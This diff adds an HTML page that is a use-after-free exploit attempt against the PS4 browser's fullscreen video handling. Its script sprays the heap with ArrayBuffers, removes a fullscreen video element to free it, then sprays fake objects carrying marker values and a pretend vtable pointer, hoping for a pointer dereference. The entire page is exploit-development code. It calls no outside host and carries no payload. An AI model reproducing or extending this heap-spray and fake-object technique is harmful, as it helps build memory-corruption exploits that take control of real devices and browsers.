@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PS4 Fullscreen UAF - Fake Object Attempt</title>
+  <style>
+    body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    #log { white-space: pre-wrap; }
+    video { width: 300px; height: 200px; }
+  </style>
+</head>
+<body>
+  <h1>PS4 Fullscreen UAF - Fake Object Test</h1>
+  <div id="log">[+] Starting...
+</div>
+  <video id="v" controls muted autoplay loop>
+    <source src="data:video/mp4;base64,AAAAHGZ0eXBNNA..." type="video/mp4">
+  </video>
+
+  <script>
+    function log(msg) {
+      document.getElementById("log").textContent += msg + "\n";
+    }
+
+    const SPRAY_COUNT = 10000;
+    let spray = [];
+    let fakeObjs = [];
+
+    function sprayHeap() {
+      log("[*] Spraying initial heap...");
+      for (let i = 0; i < SPRAY_COUNT; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+        for (let j = 0; j < view.length; j++) {
+          view[j] = 0x13371337;
+        }
+        spray.push(buf);
+      }
+      log("[+] Initial heap spray complete.");
+    }
+
+    let vid = document.getElementById("v");
+
+    async function trigger() {
+      log("[*] Requesting fullscreen...");
+      try {
+        await vid.requestFullscreen();
+        log("[+] Entered fullscreen.");
+      } catch (e) {
+        log("[!] Fullscreen request failed: " + e);
+        return;
+      }
+
+      setTimeout(() => {
+        log("[*] Exiting fullscreen and removing video...");
+        document.exitFullscreen().then(() => {
+          log("[+] Exited fullscreen.");
+        }).catch(() => {
+          log("[!] Exit fullscreen failed.");
+        });
+
+        vid.remove();
+        vid = null;
+        log("[*] Video element removed.");
+
+        for (let i = 0; i < 1000; i++) new Array(1000).fill(0);
+        log("[*] GC suggested.");
+
+        log("[*] Spraying fake objects...");
+        for (let i = 0; i < 500; i++) {
+          let buf = new ArrayBuffer(0x100);
+          let view = new Uint32Array(buf);
+          // Simple fake object layout (fake vtable + values)
+          view[0] = 0x41414141; // marker
+          view[1] = 0x42424242; // pretend pointer
+          view[2] = 0x43434343; // pretend data
+          fakeObjs.push(view);
+        }
+        log("[+] Fake object spray complete.");
+
+        try {
+          log("[*] Attempting to access fake object data...");
+          let test = fakeObjs[0];
+          log("    view[0] = 0x" + test[0].toString(16));
+          log("    view[1] = 0x" + test[1].toString(16));
+        } catch (e) {
+          log("[!] Exception: " + e);
+        }
+
+        log("[+] If crash occurs now, vtable/pointer deref might have succeeded.");
+
+      }, 1000);
+    }
+
+    sprayHeap();
+    setTimeout(trigger, 1000);
+  </script>
+</body>
+</html>
